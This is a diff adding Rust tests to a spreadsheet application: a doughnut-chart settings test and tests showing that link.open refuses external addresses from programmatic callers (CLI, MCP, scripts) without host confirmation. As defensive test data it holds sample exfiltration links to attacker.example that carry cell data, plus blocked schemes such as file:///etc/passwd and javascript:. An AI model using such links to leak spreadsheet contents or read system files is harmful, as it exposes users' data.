@@ -3238,6 +3238,21 @@ fn every_chart_kind_survives_xlsx() {
 }
 
 #[test]
+fn chart_set_doughnut_hole_and_angle() {
+    let mut s = s();
+    chart_data(&mut s);
+    s.execute("insert.chart", json!({"type": "doughnut", "range": "A1:B7"})).unwrap();
+    s.execute("chart.set", json!({"holeSize": 5, "firstSliceAngle": 400})).unwrap();
+    s.execute("chart.set", json!({"holeSize": 200})).unwrap();
+    let c = s.doc().unwrap().wb.active().unwrap().charts[0].clone();
+    assert_eq!((c.hole_size, c.first_slice_angle), (90, 40));
+    s.execute("chart.set", json!({"holeSize": 25, "firstSliceAngle": 180})).unwrap();
+    reopen(&mut s);
+    let c = &s.doc().unwrap().wb.active().unwrap().charts[0];
+    assert_eq!((c.kind, c.hole_size, c.first_slice_angle), (gridcraft_model::ChartKind::Doughnut, 25, 180));
+}
+
+#[test]
 fn scatter_of_two_columns_is_one_series_with_the_first_as_x() {
     let mut s = s();
     s.execute("range.setValues", json!({"range": "A1", "values": [["X", "Y"], [1, 10], [2, 20], [3, 30]]})).unwrap();
@@ -4680,10 +4695,55 @@ fn link_open_refuses_every_scheme_but_http_https_and_mailto() {
     }
     assert!(s.execute("link.open", json!({"cell": "A1"})).is_err());
     assert!(s.take_ui_requests().is_empty());
+    // A host's `Allow` policy opens web and e-mail addresses directly, and nothing else.
+    s.link_policy = crate::links::LinkPolicy::Allow;
+    for url in ["file:///etc/passwd", "smb://h/s", "\\\\h\\s", "JAVASCRIPT:1"] {
+        assert!(s.execute("link.open", json!({"url": url})).is_err(), "{url}");
+    }
+    assert!(s.take_ui_requests().is_empty());
     s.execute("link.open", json!({"url": "HTTPS://example.org/a"})).unwrap();
     assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("HTTPS://example.org/a".into())]);
     s.execute("link.open", json!({"url": "B2"})).unwrap();
     assert!(s.take_ui_requests().is_empty());
+}
+
+/// #2181: `link.open` is reachable by the control channel, CLI, MCP and scripts, so by default it
+/// opens no web or e-mail address (an exfiltration channel: `https://attacker/?d=<cell data>`)
+/// and asks for no dialog either; only the host's confirmed path opens one.
+#[test]
+fn programmatic_link_open_never_opens_an_external_address_without_confirmation() {
+    let mut s = s();
+    assert_eq!(s.link_policy, crate::links::LinkPolicy::Confirm, "confirmation is the default");
+    s.execute("cell.set", json!({"cell": "A1", "input": "secret"})).unwrap();
+    s.execute("insert.link", json!({"cell": "B1", "target": "https://attacker.example/?d=secret"})).unwrap();
+    s.execute("insert.link", json!({"cell": "C1", "target": "mailto:x@attacker.example"})).unwrap();
+    s.take_ui_requests();
+    for p in [
+        json!({"url": "https://attacker.example/?d=secret"}),
+        json!({"url": "http://attacker.example"}),
+        json!({"target": "MAILTO:x@attacker.example"}),
+        json!({"cell": "B1"}),
+        json!({"cell": "C1"}),
+    ] {
+        let e = s.execute("link.open", p.clone()).unwrap_err().to_string();
+        assert!(e.contains(crate::links::NEEDS_CONFIRMATION), "{p}: {e}");
+    }
+    assert!(s.take_ui_requests().is_empty(), "no OpenUrl and no dialog for a programmatic caller");
+    assert!(s.execute_headless("link.open", json!({"cell": "B1"})).is_err());
+    assert!(s.take_ui_requests().is_empty());
+    // References still navigate.
+    s.execute("link.open", json!({"url": "A1"})).unwrap();
+    assert!(s.take_ui_requests().is_empty());
+
+    // The host's confirmed path opens the allowed address, and still refuses every other scheme.
+    assert_eq!(s.open_confirmed_link(" https://example.org/a ").unwrap(), json!({"opened": "https://example.org/a"}));
+    assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("https://example.org/a".into())]);
+    for url in ["file:///etc/passwd", "\\\\h\\s", "javascript:1", "x-custom://a", "\u{1}https://a.example"] {
+        assert!(s.open_confirmed_link(url).is_err(), "{url:?}");
+    }
+    assert!(s.take_ui_requests().is_empty());
+    s.open_confirmed_link("Sheet1!C3").unwrap();
+    assert_eq!(s.doc().unwrap().selection.active, CellRef::new(2, 2));
 }
 
 #[test]
@@ -5369,6 +5429,7 @@ fn a_script_cannot_switch_windows() {
     assert_eq!(v(&s, "A1"), Value::number(2.0));
 }
 
+mod controls;
 mod equation;
 mod macros;
 mod objects;
